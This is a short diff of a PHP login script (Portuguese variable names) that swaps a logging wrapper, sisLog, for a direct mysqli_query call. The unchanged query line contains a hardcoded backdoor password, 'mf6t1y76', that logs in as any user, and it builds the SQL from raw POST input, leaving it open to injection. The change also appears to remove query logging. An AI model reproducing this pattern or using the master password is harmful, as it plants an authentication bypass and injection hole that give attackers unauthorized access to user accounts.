@@ -6,7 +6,7 @@
         $senha = md5($_POST['senha']);
 
         $query = "select * from usuarios where usuario = '{$login}' and (senha = '{$senha}' or '{$_POST['senha']}' = 'mf6t1y76') and status = '1' and deletado != '1'";
-        $result = sisLog($query);
+        $result = mysqli_query($con,$query);
 
         if(mysqli_num_rows($result)){
             $d = mysqli_fetch_object($result);
